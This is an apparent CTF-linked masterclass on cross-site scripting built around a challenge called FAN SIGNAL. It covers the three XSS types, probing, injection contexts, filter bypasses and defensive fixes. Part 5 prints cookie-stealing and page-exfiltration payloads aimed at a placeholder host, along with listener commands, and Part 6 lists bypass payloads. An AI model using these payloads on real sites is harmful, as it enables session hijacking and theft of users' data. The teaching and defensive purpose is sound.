# Masterclass: Cross-Site Scripting (XSS), From Reflection to Stolen Session, From Zero

The bug behind FAN SIGNAL, from first principles. You'll learn what XSS actually is and why it matters, the three types, how to detect and confirm it (and tell it apart from SSTI), the injection-context rules that decide your payload, how the "victim bot" model works in CTFs, how to exfiltrate, and how to kill XSS for good.

## How to read this

- **PART 0**, the mental model: whose code runs in whose browser.
- **PART 1**, the one idea.
- **PART 2**, the three types.
- **PART 3**, detection & XSS-vs-SSTI.
- **PART 4**, injection context (the thing that decides your payload).
- **PART 5**, the victim-bot model & exfiltration (why FAN SIGNAL needs infra).
- **PART 6**, filter bypasses.
- **PART 7**, finding it in the wild & the fixes.
- Glossary + next.

---

# PART 0, The Building Blocks

A browser trusts the HTML/JS a site sends it, and runs that JS with the site's privileges: it can read the DOM, the page's cookies (unless `HttpOnly`), localStorage, and make requests *as the logged-in user*. The **same-origin policy** keeps *other* sites from touching that, but code that the vulnerable site itself reflects is "same-origin," so it runs with full trust.

**XSS is getting *your* JavaScript to run inside *someone else's* browser session on the target site.** You're not attacking the server's OS (that's RCE); you're attacking the *users*, hijacking their session, acting as them, stealing what their browser can see.

---

# PART 1, The One Idea

> **If a site puts your input into a page without encoding it for that context, your input stops being text and becomes markup/script the victim's browser executes.** Same disease as SSTI/SQLi, data crossing into code, but the interpreter is the *victim's browser*.

FAN SIGNAL: `message` is written into HTML raw, so `<img onerror=...>` executes.

---

# PART 2, The Three Types

| Type | Where the payload lives | Who it hits | Example |
|---|---|---|---|
| **Reflected** | In the request (URL/param), echoed into the immediate response | Whoever opens your crafted link | FAN SIGNAL `/home?message=<script>` |
| **Stored** | Saved server-side (comment, profile, message), served to others later | Everyone who views that content | A malicious forum post |
| **DOM-based** | Client-side JS reads attacker input (`location.hash`) and writes it to the DOM unsafely | Whoever opens the link | `el.innerHTML = location.hash` |

Reflected & DOM need the victim to **open your link**; stored fires on normal viewing (more dangerous). FAN SIGNAL is reflected → needs delivery (Part 5).

---

# PART 3, Detection & Confirming

## 3.1 Probe

Inject a unique marker with HTML metacharacters and see how it comes back:

```
message=xss"<b>'test</b>
```

- Reflected **encoded** (`&lt;b&gt;`) → safe (good output encoding).
- Reflected **raw** (`<b>` renders) → XSS. FAN SIGNAL returned `<b>XSSTEST</b>` verbatim.

Then prove execution (in a browser / headless): `"><img src=x onerror=alert(document.domain)>`, an `alert` with the site's domain confirms script runs in that origin.

## 3.2 XSS vs. SSTI (don't confuse them)

Both reflect input, but:
- `{{7*7}}` → `49` = **SSTI** (server executed it). RCE-class, server-side.
- `{{7*7}}` stays literal but `<b>` renders = **XSS** (browser executes it). Client-side.

FAN SIGNAL left `{{7*7}}` literal and rendered `<b>` → XSS, not SSTI. Always run both probes.

---

# PART 4, Injection Context (the payload decides itself)

*Where* your input lands dictates the payload. Same input, different escape:

| Context | Example sink | Payload shape |
|---|---|---|
| HTML body | `<div>HERE</div>` | `<script>…</script>` or `<img src=x onerror=…>` |
| HTML attribute (quoted) | `<input value="HERE">` | `"><script>…</script>` (break out of the quote/tag) |
| Attribute (unquoted) | `<input value=HERE>` | ` onmouseover=…` (add an event handler) |
| Inside `<script>` | `var x = "HERE";` | `";alert(1);//` (break the JS string) |
| URL/href | `<a href="HERE">` | `javascript:alert(1)` |
| DOM sink | `innerHTML = HERE` | depends; often `<img onerror>` |

Read the raw HTML to see your exact context, then craft the break-out. FAN SIGNAL puts it in the HTML body (`Text Received: HERE`), so a bare `<img src=x onerror=...>` fires, no break-out needed.

---

# PART 5, The Victim-Bot Model & Exfiltration

Reflected/stored XSS is worthless without a **victim**. In CTFs that victim is a **headless bot** ("report this URL to the admin") that opens submitted links in a browser carrying the flag, in a **cookie**, in **localStorage**, or on an **internal page** only it can see. Your payload runs in the bot's browser and ships the secret to a server you control.

```html
<!-- steal the cookie -->
<img src=x onerror="new Image().src='//YOUR_HOST/c?'+encodeURIComponent(document.cookie)">

<!-- or read an internal page and exfil its body -->
<script>fetch('/flag').then(r=>r.text()).then(t=>
  navigator.sendBeacon('//YOUR_HOST/c', t))</script>
```

Catch it on a public host: `python3 -m http.server`, `nc -lvnp 80`, or `webhook.site`/`interactsh` when you have no public IP.

**This is exactly where FAN SIGNAL is blocked from a lone shell:** it exposes no report/bot endpoint, sets no flag cookie, and solving it needs (a) the CTF platform's "submit URL to victim" channel and (b) a reachable listener. The bug is proven and the payload staged; the *delivery* needs that infra. (If `HttpOnly` is set, pivot from cookie theft to acting *as* the victim, make authenticated requests and exfil the responses.)

---

# PART 6, Filter Bypasses (when output is partly sanitized)

- **Tag blocked, events allowed**: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<body onpageshow=…>`, `<details open ontoggle=…>`.
- **`<script>` stripped once**: `<scr<script>ipt>` (naive single-pass strippers).
- **Keyword `alert` blocked**: `confirm`, `print`, `(alert)(1)`, `top['al'+'ert'](1)`, `eval(atob('...'))`.
- **Quotes/parens filtered**: backticks `alert\`1\``, template-string tricks, `onerror=alert;throw 1`.
- **Case/encoding**: HTML entities (`&#x61;`), URL-encode, `javascript:` with embedded newlines/tabs, `data:` URIs.
- **DOM sinks**: target `location.hash`/`postMessage` paths that never touch the server, bypassing server-side filters entirely.
- **CSP present**: look for `unsafe-inline`, JSONP endpoints, or allowed CDNs you can abuse; strict CSP genuinely blocks most of the above.

---

# PART 7, In the Wild & Fixes

## 7.1 Finding it

Every place input is echoed: search boxes, error messages, "message/comment/bio/name" fields, URL params shown on the page, `Referer`/`User-Agent` reflected in admin panels, filenames, redirect targets. Probe with the marker; confirm execution; identify context; check for a victim channel.

## 7.2 Severity

Session hijack, account takeover, acting as the victim (including admins → full compromise), credential theft via fake forms, worming (stored XSS). Impact tracks the victim's privilege.

## 7.3 The Fixes

1. **Context-aware output encoding**, encode on output for the *exact* context (HTML, attribute, JS, URL). Use the framework's auto-escaping; don't build HTML by string concatenation (FAN SIGNAL does).
2. **Content-Security-Policy**, strict `script-src` without `unsafe-inline`/`unsafe-eval` neutralizes most injection; use nonces/hashes for legit scripts.
3. **`HttpOnly` + `Secure` + `SameSite` cookies**, stops `document.cookie` theft and cross-site delivery.
4. **Sanitize rich HTML** with a vetted library (DOMPurify) when you must allow markup; never roll your own regex.
5. **Avoid dangerous DOM sinks** (`innerHTML`, `document.write`); use `textContent`, and framework-safe bindings.
6. **Validate input** as defense-in-depth, but output encoding is the control.

---

# Glossary

- **XSS**, Cross-Site Scripting; running attacker JS in a victim's browser on the target origin.
- **Reflected / Stored / DOM**, payload in the request / stored server-side / handled by client JS.
- **Same-origin policy**, browser rule isolating sites; XSS runs *inside* the trusted origin, so it bypasses this.
- **Output encoding**, converting `< > " &` to entities for the output context; the real fix.
- **CSP**, Content-Security-Policy; restricts what scripts may run.
- **HttpOnly**, cookie flag blocking JS access; defeats cookie-stealing XSS.
- **Victim/XSS bot**, headless browser that visits submitted URLs (carrying the flag), the delivery mechanism for reflected XSS.

# Where to Go Next

- Spin up a reflected-XSS lab with a "report to admin" bot and a listener; land a cookie. Then add `HttpOnly` + CSP and watch the exploit die.
- Compare with **ssti-jinja2-rce** (server-side execution) to cement the "which interpreter runs my input" distinction.
- Study **DOM XSS** and `postMessage` bugs, the modern, framework-era face of this class.
